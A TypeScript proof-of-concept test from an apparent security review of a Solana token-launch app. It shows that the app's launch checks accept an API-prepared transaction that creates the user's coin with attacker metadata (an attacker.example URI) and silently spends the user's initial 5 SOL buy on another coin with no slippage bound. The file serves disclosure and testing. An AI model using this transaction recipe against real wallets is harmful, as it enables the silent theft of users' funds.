/**
 * PoC for finding M-1 (security-review/REPORT.md): the app's checks on the API-prepared
 * launch transaction do not bind the first buy to the launched mint, nor the metadata to
 * what the user typed. A compromised / malicious API can return a transaction that
 * creates the user's coin AND spends the user's "initial buy" on a different, existing
 * coin (e.g. the attacker's), with min_tokens_out = 0. Both `checkPreparedLaunch` and the
 * silent-signing allow-list accept it, so with Instant trading on it is signed with no
 * Privy prompt. The SDK's own `inspectLaunchTx` would have rejected it.
 *
 * Run (from app/):  node --import tsx --test ../security-review/app-poc/launch-buy-redirect.test.ts
 */
import assert from "node:assert/strict";
import { it } from "node:test";
import { buyIx, computeBudgetIxs, createCoinIx, inspectLaunchTx } from "@fumpad/sdk";
import { Keypair, TransactionMessage, VersionedTransaction } from "@solana/web3.js";
import { vetFumpadTx } from "../../app/src/chain/allowlist";
import { checkPreparedLaunch } from "../../app/src/chain/program";

const SOL = BigInt(1_000_000_000);

it("a prepared launch whose first buy targets another coin passes both app checks", () => {
  const wallet = Keypair.generate().publicKey; // the creator (Trading wallet)
  const mintKp = Keypair.generate(); // the reserved mint the API co-signs as
  const attackerCoin = Keypair.generate().publicKey; // some existing coin the attacker wants bought
  // Grinding a real `…fmbL` key takes minutes in JS; the check takes the suffix as a parameter,
  // so use the mint's own last character. The logic under test is identical.
  const suffix = mintKp.publicKey.toBase58().slice(-1);

  const msg = new TransactionMessage({
    payerKey: wallet,
    recentBlockhash: "11111111111111111111111111111111",
    instructions: [
      ...computeBudgetIxs(400_000),
      // Metadata differs from what the user typed in the launch form: not checked either.
      createCoinIx({ creator: wallet, mint: mintKp.publicKey, name: "NOT WHAT YOU TYPED", symbol: "SCAM", uri: "https://attacker.example/m.json" }),
      // The "first buy" spends the user's initial-buy amount on attackerCoin with no slippage bound.
      buyIx({ user: wallet, mint: attackerCoin, solIn: 5n * SOL, minTokensOut: 0n, openTickets: [] }),
    ],
  }).compileToV0Message();
  const tx = new VersionedTransaction(msg);
  tx.sign([mintKp]);

  // 1) app/src/chain/program.ts checkPreparedLaunch: accepts.
  assert.doesNotThrow(() => checkPreparedLaunch(tx, wallet, mintKp.publicKey.toBase58(), suffix));
  // 2) app/src/chain/allowlist.ts vetFumpadTx with the exact policy tx.ts uses for launch: accepts.
  assert.doesNotThrow(() => vetFumpadTx(tx, wallet, { action: "launch", coSigner: mintKp.publicKey.toBase58(), maxSolInLamports: 5n * SOL }));
  // 3) The SDK's inspectLaunchTx (not used by the app) catches it.
  assert.throws(() => inspectLaunchTx(tx), /creator's first buy/);
});
